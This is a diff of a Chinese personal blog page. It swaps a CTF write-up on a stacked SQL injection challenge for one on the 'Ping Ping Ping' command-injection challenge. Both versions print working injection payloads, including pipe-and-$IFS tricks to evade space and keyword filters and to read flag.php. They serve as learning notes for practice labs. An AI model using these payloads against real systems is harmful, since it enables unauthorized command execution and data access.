@@ -3,30 +3,31 @@
 <head>
   <meta charset="utf-8">
   
-  <title>4-buu练习EasySQL | baba童鞋的博客</title>
+  <title>5-buu练习Ping Ping Ping | baba童鞋的博客</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="打开题目链接，界面如下：可以知道应该使用堆叠查询植入攻击查看数据库：  1;show dadabases;    没有什么发现查看数据表：  1;show tables;    猜测flag是在flag表中的flag字段中  1;select flag from flag;   发现flag被过滤了（本霸霸已经完全木有思路了，淦！查看别人wp） 别人家的wp： 这道题目需要我们去对后端语句进行猜测">
+  <meta name="description" content="打开题目，界面如下结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：  ?&#x2F;ip&#x3D;127.0.0.1  发现ping通过了！   接下来管道符ls来查看目录文件名称：  url + &#x2F;?ip&#x3D;127.0.0.1|ls    查看flag.php文件内容： url + &#x2F;?ip&#x3D;127.0.0.1|cat flag.php但是并没有出现flag，而是以下界面">
 <meta property="og:type" content="article">
-<meta property="og:title" content="4-buu练习EasySQL">
-<meta property="og:url" content="http://example.com/2021/01/18/bu/index.html">
+<meta property="og:title" content="5-buu练习Ping Ping Ping">
+<meta property="og:url" content="http://example.com/2021/01/19/ping/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="打开题目链接，界面如下：可以知道应该使用堆叠查询植入攻击查看数据库：  1;show dadabases;    没有什么发现查看数据表：  1;show tables;    猜测flag是在flag表中的flag字段中  1;select flag from flag;   发现flag被过滤了（本霸霸已经完全木有思路了，淦！查看别人wp） 别人家的wp： 这道题目需要我们去对后端语句进行猜测">
+<meta property="og:description" content="打开题目，界面如下结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：  ?&#x2F;ip&#x3D;127.0.0.1  发现ping通过了！   接下来管道符ls来查看目录文件名称：  url + &#x2F;?ip&#x3D;127.0.0.1|ls    查看flag.php文件内容： url + &#x2F;?ip&#x3D;127.0.0.1|cat flag.php但是并没有出现flag，而是以下界面">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb1.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb2.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb3.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb4.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb5.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb6.png">
-<meta property="article:published_time" content="2021-01-18T10:56:06.000Z">
-<meta property="article:modified_time" content="2021-01-18T11:36:02.539Z">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping1.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping2.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping3.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping4.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping5.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping6.png">
+<meta property="og:image" content="http://example.com/2021/01/19/ping/ping7.png">
+<meta property="article:published_time" content="2021-01-19T11:06:17.000Z">
+<meta property="article:modified_time" content="2021-01-19T12:00:13.698Z">
 <meta property="article:author" content="Jialu">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/18/bu/bb1.png">
+<meta name="twitter:image" content="http://example.com/2021/01/19/ping/ping1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -178,11 +179,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-bu" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ping" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/18/bu/" class="article-date">
-  	<time datetime="2021-01-18T10:56:06.000Z" itemprop="datePublished">2021-01-18</time>
+      <a href="/2021/01/19/ping/" class="article-date">
+  	<time datetime="2021-01-19T11:06:17.000Z" itemprop="datePublished">2021-01-19</time>
 </a>
     </div>
   
@@ -195,7 +196,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      4-buu练习EasySQL
+      5-buu练习Ping Ping Ping
       
     </h1>
   
@@ -213,49 +214,52 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目链接，界面如下：<br><img src="/2021/01/18/bu/bb1.png"><br>可以知道应该使用堆叠查询植入攻击<br>查看数据库：</p>
+        <p>打开题目，界面如下<br><img src="/2021/01/19/ping/ping1.png"><br>结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：</p>
 <ul>
-<li>1;show dadabases;</li>
-</ul>
+<li>?/ip=127.0.0.1
+</li></ul>
+发现ping通过了！
 
-<p><img src="/2021/01/18/bu/bb2.png"></p>
-<p>没有什么发现<br>查看数据表：</p>
+<p><img src="/2021/01/19/ping/ping2.png"></p>
+<p>接下来管道符ls来查看目录文件名称：</p>
 <ul>
-<li>1;show tables;</li>
-</ul>
+<li>url + /?ip=127.0.0.1|ls
+</li></ul>
 
-<p><img src="/2021/01/18/bu/bb3.png"></p>
-<p>猜测flag是在flag表中的flag字段中</p>
+<p><img src="/2021/01/19/ping/ping3.png"></p>
+<p>查看flag.php文件内容： url + /?ip=127.0.0.1|cat flag.php<br>但是并没有出现flag，而是以下界面</p>
+<p><img src="/2021/01/19/ping/ping4.png"></p>
+<p>应该是空格键被过滤掉了<br>过滤空格键的解决办法：将空格替换成“$IFS$1”，（“$1”里的“1”可以是任意数字）：</p>
 <ul>
-<li>1;select flag from flag;</li>
-</ul>
+<li>url + /?ip=127.0.0.1|cat$IFS$1flag.php
+</li></ul>
 
-<p><img src="/2021/01/18/bu/bb4.png"><br>发现flag被过滤了<br><img src="/2021/01/18/bu/bb5.png"><br>（本霸霸已经完全木有思路了，淦！查看别人wp）</p>
-<p><b>别人家的wp：</b></p>
-<p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
-<p>解法1：</p>
-<p>输入的内容为*,1</p>
-<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
-<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
-<p>解法2：</p>
-<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
-<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
-<p><img src="/2021/01/18/bu/bb6.png"></p>
-<p>duang!成功得到flag！</p>
-<p><b>几种常见的mode介绍:</b></p>
+<p><img src="/2021/01/19/ping/ping5.png"></p>
+<p>发现flag被过滤了，那么只好查看index.php文件</p>
 <ul>
-<li>ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。
-</li><li>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。
-</li><li>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制
-</li><li>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。
-</li><li>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。
-</li><li>ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL
-</li><li>NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户
-</li><li>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常
-</li><li>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似
-</li><li>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</li>
-</ul>
+<li>url + /?ip=127.0.0.1|cat$IFS$1index.php
+</li></ul>
+文件内容如下：
 
+<p><img src="/2021/01/19/ping/ping6.png"></p>
+<p>发现过滤了好多字符，但是在最后看到了a变量，那么就可以将a的值覆盖掉，来进行绕过</p>
+<ul>
+<li>url + /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+</li></ul>
+查看源代码得到flag！
+
+<p><img src="/2021/01/19/ping/ping7.png"></p>
+<p>————————————<br>盘点一下学到的知识点吧！<br>1、$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格；<br>2、可以解决空格问题的方法：</p>
+<ul>
+<li>{cat,flag.txt}
+</li><li>cat${IFS}flag.txt
+</li><li>cat$IFS$9flag.txt
+</li><li>cat<flag.txt <li>cat<>flag.txt
+<br>这些是linux下巧妙越过空格的方法;
+<br>下面是windows下绕过空格的方法，实用性不强，就type这个命令可以用
+<li>type.\flag.txt
+</li><li>type,flag.txt </li></flag.txt></li></ul>
+<br>（又是被摧残的一天giao！！！）
       
     </div>
     
@@ -264,18 +268,9 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/19/ping/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          5-buu练习Ping Ping Ping
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/17/buu/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">3-buu练习Secret File</div>
+    <a href="/2021/01/18/bu/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">4-buu练习EasySQL</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -285,7 +280,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="bu" data-title="4-buu练习EasySQL" data-url="http://example.com/2021/01/18/bu/"  data-images="/img/huahua.jpg" data-content="4-buu练习EasySQL">
+<div class="ds-share share" data-thread-key="ping" data-title="5-buu练习Ping Ping Ping" data-url="http://example.com/2021/01/19/ping/"  data-images="/img/huahua.jpg" data-content="5-buu练习Ping Ping Ping">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
